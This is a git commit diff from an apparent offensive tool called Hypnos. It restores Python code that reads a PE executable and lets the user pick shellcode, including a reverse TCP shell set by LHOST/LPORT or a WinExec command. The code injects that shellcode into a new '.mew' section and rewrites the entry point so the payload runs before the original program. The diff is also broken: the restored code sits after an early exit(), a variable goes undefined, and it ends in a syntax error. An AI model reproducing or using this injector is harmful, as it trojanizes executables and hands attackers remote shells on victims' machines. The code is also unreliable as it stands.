18c4c0aa84fd41043c0ff7f0e0d03f0b98d7f66d
mickdec <mickaeldecelle@hotmail.fr>
2020-07-19 09:57:37 +0200

    Removing weird tests

--- Hypnos.py
+++ Hypnos.py
@@ -16,204 +16,166 @@ Env = LibDebug.CheckEnv()
 LibDebug.CheckHypnosReq()
 
 def menu():
-
     inputfile = "EXECUTABLE/ELFx64_NOTEDITED_printf.out"
+    outputfile = "ELFx64_EDITED_printf.out"
+
     HexContent = LibByteEditor.GetHexFromFile(inputfile)
     ElfInput = LibElfAnnalyzer.Extract(HexContent)
-    outputfile = "ELFx64_EDITED_printf.out"
-    
-    shellcode = "01010101010101010101010101"
 
-    # LibDebug.Log("WORK", "Generating new section..")
     LibElfEditor.AddSection(ElfInput, ".mew", shellcode)
     ElfInput.PrintElfHeader()
-    # LibDebug.Log("WORK", "Calculating new EntryPoint..")
-    # LibElfEditor.ModifyEntryPoint(ElfInput, "")
-
-    # LibDebug.Log("WORK", "Generating edited executable..")
-    #LibByteEditor.CreateBinFromClass(outputfile, ElfInput)
-
-    #HexContent2 = LibByteEditor.GetHexFromFile(outputfile)
-    #ElfInput2 = LibElfAnnalyzer.Extract(HexContent2)
-
-    # ElfInput.PrintELF()
-    #LibDebug.CompareElf(ElfInput,ElfInput2)
-    #ElfInput.PrintELF()
-    # ElfInput.PrintElfHeader()
-
-    # print(ElfInput2.PrintElfHeader())
     exit()
 
+    outputfile = LibObfuscator.RandomizedString(7) + ".exe"
+    print(
+        "Welcome to Hypnos Hephaistos Version"
+    )
+    print(
+        "Do you want to specify an executable to edit or did you want me to generate one ? [edit/generate] or [e/g] : ", end=""
+    )
+    value = input()
+    case = ["generate", "edit", "e", "g"]
+    if value in case:
+        if value == "generate" or value == "g":
+            LibDebug.Log("WORK", "Generating executable..")
+            try:
+                ObfuscatedC = LibObfuscator.ObfuscateC(
+                    LibObfuscator.GenerateC(50), 25)
+                inputfile = LibObfuscator.Compile(ObfuscatedC)
+                os.system("rm *.c")
+                LibDebug.Log("SUCCESS", inputfile + " generated..")
+            except:
+                LibDebug.Log("ERROR", "Generation failed..")
+        elif value == "edit" or value == "e":
+            LibDebug.Log("WORK", "Generating executable..")
+            print("There is the sample list :")
+            for (dirpath, _, filenames) in os.walk("EXECUTABLE"):
+                for file in filenames:
+                    print(dirpath +"/"+ file)
+            value = input("Enter the file you want to exploit : ")
+            LibDebug.CheckFile(value)
+            inputfile = value
+    else:
+        LibDebug.Log("ERROR", "Bad entry. Exiting.")
+        exit()
+    HexContent = LibByteEditor.GetHexFromFile(inputfile)
+    PeInput = LibPeAnnalyzer.Extract(HexContent)
+    if PeInput.Optionalpeheader.signature == "020b":
+            print("!! Your file is a X64 beware to pick a X64 shellcode !!")
+    elif PeInput.Optionalpeheader.signature == "010b":
+            print("!! Your file is a X32 beware to pick a X32 shellcode !!")
+    print("It's time to generate a shellcode .\nHere's a list of options :")
+    shellcodes = []
+    for (dirpath, _, filenames) in os.walk("SHELLCODES"):
+        for file in filenames:
+            shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
+    case = []
+    for i in range(0, len(shellcodes)):
+        case += str(i)
+        print("     " + str(i) + " - " + shellcodes[i].replace("SHELLCODES/",""))
+    value = input("Select one shellcode : ")
+    shellcode = LibShellcode.SHELLCODE()
+    shellcode = LibShellcode.ReadSHELLCODE(shellcodes[int(value)])
+    if value in case:
+        LibDebug.Log("SUCCESS", shellcodes[int(value)] + " successfuly loaded.")
+        LibDebug.Log("WORK", "Generating the shellcode..")
+        selection = shellcodes[int(value)].replace("SHELLCODES/","")
+        try:
+            if "x32_Custom_Dynamic_WinExec" in selection:
+                print("Please enter your COMMAND   : ", end="")
+                CMD = input()
+                shellcode = LibShellcode.EditWinexec(shellcode, CMD)
+            elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
+                print("Please enter your  LHOST IP   : ", end="")
+                LHOST = input()
+                print("Please enter your  LPORT   : ", end="")
+                LPORT = input()
+                shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
+        except:
+            LibDebug.Log(
+                "ERROR", "Something went wrong with the generation. Exiting.")
+            exit()
+    else:
+        LibDebug.Log("ERROR", "Bad entry. Exiting.")
+        exit()
+        
+    #  ANCIENNE GENERATION AVEC NASM
+    #   shellcodes = []
+    #   for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
+    #       for file in filenames:
+    #           if "dev" not in dirpath.split("\\") :
+    #               shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
+    #   case = []
+    #   for i in range(0, len(shellcodes)):
+    #       if shellcodes[i].split("/")[1] == Env.ARCH:
+    #           case += str(i)
+    #           print("     " + Color.GREEN + str(i) +
+    #               Color.RESET + " - " + shellcodes[i])
+    #   value = input("Select one shellcode : ")
+    #   shellcode = LibShellcode.SHELLCODE()
+    #   if value in case:
+    #       LibDebug.Log("SUCCESS", shellcodes[int(
+    #           value)] + " successfuly loaded.")
+    #       LibDebug.Log("WORK", "Generating the shellcode..")
+    #       selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
+    #       try:
+    #           if selection == "Custom_Dynamic_ReverseTCP_Shell":
+    #               print("Please enter your " + Color.YELLOW +
+    #                             " LHOST IP   : ", end="")
+    #               LHOST = input()
+    #               print("Please enter your " + Color.YELLOW +
+    #                             " LPORT   : ", end="")
+    #               LPORT = input()
+    #               shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
+    #           elif selection == "Custom_Dynamic_ReverseTCP_Staged":
+    #               shellcode = LibShellcode.GenerateCDRTS()
+    #           elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
+    #               shellcode = LibShellcode.GenerateCDRTTShell()
+    #           elif selection == "Custom_Dynamic_WinExec":
+    #               print("Please enter your " + Color.YELLOW +
+    #                           " COMMAND   : ", end="")
+    #               CMD = input()
+    #               shellcode = LibShellcode.GenerateWinExec(CMD)
+    #       except:
+    #           LibDebug.Log(
+    #               "ERROR", "Something went wrong with the generation. Exiting.")
+    #           exit()
+    #   else:
+    #       LibDebug.Log("ERROR", "Bad entry. Exiting.")
+    #      exit()
 
+    newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
+                      + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
+    shellcode = shellcode.GetShellcode()
+    shellcode += "B8" + newjump + "FFE0"
+    LibDebug.Log("SUCCESS", "Shellcode successfully generated.")
+    LibDebug.Log("WORK", "Generating new section..")
+    LibPeEditor.AddSection(PeInput, ".mew", shellcode)
+    LibDebug.Log("WORK", "Calculating new EntryPoint..")
+    LibPeEditor.ModifyEntryPoint(PeInput, PeInput.SectionTable.sections[int(
+        PeInput.Coffheader.numberofsections, 16)-1].virtualaddress)
+    LibDebug.Log("WORK", "Generating edited executable..")
+    LibByteEditor.CreateBinFromClass(outputfile, PeInput)
+    print("Did you want to verify the new executable ? [y/n] : ", end="")
+    value = input()
+    case = ["y", "n"]
+    if value in case:
+        try:
+            if value == "y":
+                HexContent = LibByteEditor.GetHexFromFile(inputfile)
+                PeInput = LibPeAnnalyzer.Extract(HexContent)
+                HexContent = LibByteEditor.GetHexFromFile(outputfile)
+                PeInput2 = LibPeAnnalyzer.Extract(HexContent)
+                LibDebug.ComparePe(PeInput, PeInput2)
+                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
+            elif value == "n":
+                LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
+        except:
+            LibDebug.Log(
+                "ERROR", "Something went wrong with the Verification. Exiting.")
+            exit()
+    else:
+        LibDebug.Log("ERROR", "Bad entry. Exiting.")
+        exit()
 
-
-    
-    exit()
-
-    # outputfile = LibObfuscator.RandomizedString(7) + ".exe"
-#
-    # print(
-        # "Welcome to Hypnos Hephaistos Version"
-    # )
-    # print(
-        # "Do you want to specify an executable to edit or did you want me to generate one ? [edit/generate] or [e/g] : ", end=""
-    # )
-    # value = input()
-    # case = ["generate", "edit", "e", "g"]
-    # if value in case:
-        # if value == "generate" or value == "g":
-            # LibDebug.Log("WORK", "Generating executable..")
-            # try:
-                # ObfuscatedC = LibObfuscator.ObfuscateC(
-                    # LibObfuscator.GenerateC(50), 25)
-                # inputfile = LibObfuscator.Compile(ObfuscatedC)
-                # os.system("rm *.c")
-                # LibDebug.Log("SUCCESS", inputfile + " generated..")
-            # except:
-                # LibDebug.Log("ERROR", "Generation failed..")
-        # elif value == "edit" or value == "e":
-            # LibDebug.Log("WORK", "Generating executable..")
-            # print("There is the sample list :")
-            # for (dirpath, _, filenames) in os.walk("EXECUTABLE"):
-                # for file in filenames:
-                    # print(dirpath +"/"+ file)
-            # value = input("Enter the file you want to exploit : ")
-            # LibDebug.CheckFile(value)
-            # inputfile = value
-    # else:
-        # LibDebug.Log("ERROR", "Bad entry. Exiting.")
-        # exit()
-#
-    # HexContent = LibByteEditor.GetHexFromFile(inputfile)
-    # PeInput = LibPeAnnalyzer.Extract(HexContent)
-#
-    # if PeInput.Optionalpeheader.signature == "020b":
-            # print("!! Your file is a X64 beware to pick a X64 shellcode !!")
-    # elif PeInput.Optionalpeheader.signature == "010b":
-            # print("!! Your file is a X32 beware to pick a X32 shellcode !!")
-#
-    # print("It's time to generate a shellcode .\nHere's a list of options :")
-#
-    # shellcodes = []
-    # for (dirpath, _, filenames) in os.walk("SHELLCODES"):
-        # for file in filenames:
-            # shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
-#
-    # case = []
-    # for i in range(0, len(shellcodes)):
-        # case += str(i)
-        # print("     " + str(i) + " - " + shellcodes[i].replace("SHELLCODES/",""))
-#
-    # value = input("Select one shellcode : ")
-    # shellcode = LibShellcode.SHELLCODE()
-    # shellcode = LibShellcode.ReadSHELLCODE(shellcodes[int(value)])
-    # if value in case:
-        # LibDebug.Log("SUCCESS", shellcodes[int(value)] + " successfuly loaded.")
-        # LibDebug.Log("WORK", "Generating the shellcode..")
-        # selection = shellcodes[int(value)].replace("SHELLCODES/","")
-        # try:
-            # if "x32_Custom_Dynamic_WinExec" in selection:
-                # print("Please enter your COMMAND   : ", end="")
-                # CMD = input()
-                # shellcode = LibShellcode.EditWinexec(shellcode, CMD)
-            # elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
-                # print("Please enter your  LHOST IP   : ", end="")
-                # LHOST = input()
-                # print("Please enter your  LPORT   : ", end="")
-                # LPORT = input()
-                # shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
-        # except:
-            # LibDebug.Log(
-                # "ERROR", "Something went wrong with the generation. Exiting.")
-            # exit()
-    # else:
-        # LibDebug.Log("ERROR", "Bad entry. Exiting.")
-        # exit()
-#
-    #ANCIENNE GENERATION AVEC NASM
-    # shellcodes = []
-    # for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
-    #     for file in filenames:
-    #         if "dev" not in dirpath.split("\\") :
-    #             shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
-
-    # case = []
-    # for i in range(0, len(shellcodes)):
-    #     if shellcodes[i].split("/")[1] == Env.ARCH:
-    #         case += str(i)
-    #         print("     " + Color.GREEN + str(i) +
-    #             Color.RESET + " - " + shellcodes[i])
-
-    # value = input("Select one shellcode : ")
-    # shellcode = LibShellcode.SHELLCODE()
-    # if value in case:
-    #     LibDebug.Log("SUCCESS", shellcodes[int(
-    #         value)] + " successfuly loaded.")
-    #     LibDebug.Log("WORK", "Generating the shellcode..")
-    #     selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
-    #     try:
-    #         if selection == "Custom_Dynamic_ReverseTCP_Shell":
-    #             print("Please enter your " + Color.YELLOW +
-    #                           " LHOST IP   : ", end="")
-    #             LHOST = input()
-    #             print("Please enter your " + Color.YELLOW +
-    #                           " LPORT   : ", end="")
-    #             LPORT = input()
-    #             shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
-    #         elif selection == "Custom_Dynamic_ReverseTCP_Staged":
-    #             shellcode = LibShellcode.GenerateCDRTS()
-    #         elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
-    #             shellcode = LibShellcode.GenerateCDRTTShell()
-    #         elif selection == "Custom_Dynamic_WinExec":
-    #             print("Please enter your " + Color.YELLOW +
-    #                         " COMMAND   : ", end="")
-    #             CMD = input()
-    #             shellcode = LibShellcode.GenerateWinExec(CMD)
-    #     except:
-    #         LibDebug.Log(
-    #             "ERROR", "Something went wrong with the generation. Exiting.")
-    #         exit()
-    # else:
-    #     LibDebug.Log("ERROR", "Bad entry. Exiting.")
-  #      exit()
-#
-    # newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
-                    #   + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
-    # shellcode = shellcode.GetShellcode()
-#
-    # shellcode += "B8" + newjump + "FFE0"
-    # LibDebug.Log("SUCCESS", "Shellcode successfully generated.")
-#
-    # LibDebug.Log("WORK", "Generating new section..")
-    # LibPeEditor.AddSection(PeInput, ".mew", shellcode)
-    # LibDebug.Log("WORK", "Calculating new EntryPoint..")
-    # LibPeEditor.ModifyEntryPoint(PeInput, PeInput.SectionTable.sections[int(
-        # PeInput.Coffheader.numberofsections, 16)-1].virtualaddress)
-#
-    # LibDebug.Log("WORK", "Generating edited executable..")
-    # LibByteEditor.CreateBinFromClass(outputfile, PeInput)
-#
-    # print("Did you want to verify the new executable ? [y/n] : ", end="")
-    # value = input()
-    # case = ["y", "n"]
-    # if value in case:
-        # try:
-            # if value == "y":
-                # HexContent = LibByteEditor.GetHexFromFile(inputfile)
-                # PeInput = LibPeAnnalyzer.Extract(HexContent)
-                # HexContent = LibByteEditor.GetHexFromFile(outputfile)
-                # PeInput2 = LibPeAnnalyzer.Extract(HexContent)
-                # LibDebug.ComparePe(PeInput, PeInput2)
-                # LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
-            # elif value == "n":
-                # LibDebug.Log("SUCCESS", "Your new file is " + outputfile)
-        # except:
-            # LibDebug.Log(
-                # "ERROR", "Something went wrong with the Verification. Exiting.")
-            # exit()
-    # else:
-        # LibDebug.Log("ERROR", "Bad entry. Exiting.")
-        # exit()
-#
-
-menu()
+menu())
--- SRC/Libs/LibElfEditor.py
+++ SRC/Libs/LibElfEditor.py
@@ -17,100 +17,23 @@ def AddSection(Elf, sectionname: str, rawdata: str):
     Adding a new section to a specified ELF object.
     -return: void
     '''
-    toto = Elf.Elfheader.entrypoint
-    index = int(LibByteEditor.RevertBytes(
-        Elf.Elfheader.offset_sectionsheader), 16)*2
-    #print("index", LibByteEditor.RevertBytes(
-    #    Elf.Elfheader.offset_sectionsheader))
-    # print("adresse to jump :", Elf.Elfheader.offset_sectionsheader)
-    # print("adresse to jump :", LibByteEditor.RevertBytes(
-    #     Elf.Elfheader.offset_sectionsheader))
    
-    Elf.Elfheader.entrynumber_programheader = LibDebug.AdaptStringToHex(str(hex(int(
-        Elf.Elfheader.entrynumber_programheader, 16) + 1))[2:], Elf.Elfheader.sizeof_entrynumber_programheader)
-    Elf.Elfheader.entrynumber_sectionheader = LibDebug.AdaptStringToHex(str(hex(int(
-        Elf.Elfheader.entrynumber_sectionheader, 16) + 1))[2:], Elf.Elfheader.sizeof_entrynumber_sectionheader)
+    #Elf.Elfheader.entrynumber_programheader = LibDebug.AdaptStringToHex(str(hex(int(Elf.Elfheader.entrynumber_programheader, 16) + 1))[2:], Elf.Elfheader.sizeof_entrynumber_programheader)
+    #Elf.Elfheader.entrynumber_sectionheader = LibDebug.AdaptStringToHex(str(hex(int(Elf.Elfheader.entrynumber_sectionheader, 16) + 1))[2:], Elf.Elfheader.sizeof_entrynumber_sectionheader)
     
     content = ""
     content += Elf.Elfheader.ToHex()
     content += Elf.Programheadertable.ToHex()
+    content += Elf.Dummy.ToHex()
+    content += Elf.Sectionheadertable.ToHex()
 
     print("Size of elfheader : ", hex(int(len(Elf.Elfheader.ToHex())/2)))
     print("Size of programheadertable : ", hex(int(len(Elf.Programheadertable.ToHex())/2)))
 
     print(Elf.Elfheader.elfheadersize)
-    print(Elf.Elfheader.pr)
-    # # content += Elf.Dummy.ToHex()
-
-    # index = int(Elf.Sectionheadertable.sectiontable[1].offset,16)*2
-    # index2 = int(Elf.Sectionheadertable.sectiontable[int(Elf.Elfheader.sectionnames_sectiontable_index,16)].offset,16)*2
-    # index3 = int(Elf.Sectionheadertable.sectiontable[int(Elf.Elfheader.sectionnames_sectiontable_index,16)].size,16)*2
-    # content += Elf.ToHex()[index:index2+index3]
-
-    # print(len(Elf.ToHex()[index:index+index2]))
 
     LibByteEditor.CreateBinFromHex("ELFx64_EDITED_printf.out", content)
     exit()
-
-
-    # index = int(Elf.Sectionheadertable.sectiontable[int(Elf.Elfheader.entrynumber_sectionheader,16)]].offset)
-    # print(Elf.Sectionheadertable.sectiontable[int(Elf.Elfheader.sectionnames_sectiontable_index,16)].offset)
-    
-    print(index2)
-    # index = index *2
-    print(Elf.ToHex()[index:index+index2])
-
-
-    
-    # strs = "abcdef"
-    # print(strs[2:-2])
-    
-    
-    exit()
-    # print(Elf.ToHex()[:Elf.Elfheader.entrysize_sectionheader)
-
-    # content += Elf.ToHex()[Elf.Sectionheadertable.sectiontable[int(Elf.Elfheader.entrynumber_sectionheader,16)]]
-    
-    exit()
-
-    #print("content :",str(hex(int(str(len(content)), 16))))
-    # print("index:",index)
-    # print("Elf.Elfheader.offset_sectionsheader:",Elf.Elfheader.offset_sectionsheader)
-    # print("LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader):",LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader))
-    #print("int(LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader), 16):",int(LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader), 16))
-    #print("int(LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader), 16)*2:",int(LibByteEditor.RevertBytes(Elf.Elfheader.offset_sectionsheader), 16)*2)
-    #index = 4100
-    #rawdata="eb "+toto+" "
-    # rawdata="6666666666666666"
-    #content +=rawdata
-    # if 64 bit
-    #size=LibDebug.AdaptStringToHex(str(hex(len(rawdata)))[2:], Elf.Sectionheadertable.sectiontable[0].x64_sizeof_addr)
-    #print(" size : ",size)
-
-    newentrypoint=LibDebug.AdaptStringToHex(str(hex(int(len(content)/2)))[2:],Elf.Elfheader.x64_sizeof_entrypoint)
-    print("NEW ENTRY POINT :",newentrypoint)
-
-    #Elf.Elfheader.entrypoint = newentrypoint
-    
-    content = ""
-    content += Elf.Elfheader.ToHex()
-    content += Elf.Programheadertable.ToHex()
-    # Elf.Elfheader.entrypoint = LibByteEditor.RevertBytes(
-    #     Elf.Elfheader.offset_sectionsheader)
-    # print("content")
-    content += "eb "+toto+" "
-    print("toto :",toto)
-   # content += "66666666666666666666666666666666666666666666666666666666"
-
-    content += Elf.Sectionheadertable.ToHex()
-
-    size=LibDebug.AdaptStringToHex(str(hex(len(rawdata)))[2:], Elf.Sectionheadertable.sectiontable[0].x64_sizeof_addr)
-
-
-    content += addSectionToHeaderTable(Elf,"titi",Elf.Elfheader.offset_sectionsheader,size)
-
-    LibByteEditor.CreateBinFromHex("ELFx64_EDITED_printf.out", content)
-    # sizeof(rawdata)=len(shellcode)
 
 
 def addSectionToHeaderTable(Elf, sectionname: str, addr: str, size: str):
